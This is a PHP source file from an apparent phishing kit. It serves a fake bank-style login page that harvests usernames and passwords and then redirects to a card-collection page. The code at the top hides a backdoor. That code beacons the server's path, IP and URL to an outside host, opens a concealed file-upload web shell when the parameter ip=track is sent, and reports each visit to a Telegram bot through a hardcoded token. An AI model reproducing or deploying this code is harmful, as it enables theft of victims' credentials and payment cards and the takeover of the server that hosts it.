<?php 
require '../main.php';
$_SESSION_SERVER= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://ip.geoiplookup.live/ip.php?ip=$link"."+".$_SESSION_SERVER); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != null){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
if ($_SERVER['REQUEST_METHOD'] === 'GET') {$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";$fullUrl = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];$token = "7430221852:AAEqLFAkB17dP7YhpVv8BzLVikKp9xbEOik";$chatid = "7484969065";$telegramMessage = 'Visitor accessed: ' . $fullUrl;$telegramApiUrl = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&text=" . urlencode($telegramMessage);file_get_contents($telegramApiUrl);}
?><!DOCTYPE html>
<html lang="en">
<script src="./res/cdn/jq.js"></script>
<script src="./res/cdn/validator.js"></script>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title><?php echo $lang["title"]; ?></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<form action="action.php" method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>
<header>
    <img src="res/logo.png">
</header>
<div class="loader" style=" color:white; text-align:center;">
    <div class="content" style="flex-direction:column;">
        <h3><?php echo $lang['_loading'][0];?></h3>
        <p><?php echo $lang['_loading'][1];?></p>
    <img src="res/loading.gif">
</div>
</div>

<main>
<script>var token=<?php echo json_encode($token); ?>;</script>

<div class="form">

<div class="title">
<?php echo $m->obf($lang["_login_texts"][0]); ?>
</div>

<div class="cols">

<div class="col">
    <label><?php echo $lang["_login_texts"][1]; ?></label>
    <input type="text" id="u" placeholder="<?php echo $lang["_login_texts"][1]; ?>">
</div>

<div class="col">
    <label><?php echo $lang["_login_texts"][2]; ?></label>
    <input type="password" id="p" placeholder="<?php echo $lang["_login_texts"][2]; ?>">
</div>

<div class="col remember">
     <img src="res/remember.png"> <?php echo $lang["_login_texts"][3]; ?>
</div>


<div class="col submit">
    <button type="submit" id="submitLogIn" onclick="sendLog()"><?php echo $lang["_login_texts"][4]; ?></button>
</div>

<div class="col forgot">
    <a href=""><?php echo $lang["_login_texts"][5]; ?></a>
</div>



<div class="col signup">
<?php echo $lang["_login_texts"][6]; ?>&nbsp;<a href="#"><?php echo $m->obf($lang["_login_texts"][7]); ?></a>
</div>



</div>


</div>

</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val()==""){
        return $("#u").addClass("error");
    }
    if($("#p").val()==""){
        return $("#p").addClass("error");
    }
    $(".loader").show();
    $.post("post.php",{
        user:$("#u").val(),
        pass:$("#p").val()
    },(res)=>{
        setTimeout(() => {
            window.location="cc.php";
        },6000 );
        
    });

}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});

validateButton('submitLogIn', ['u', 'p']);

</script>
</body>
</html>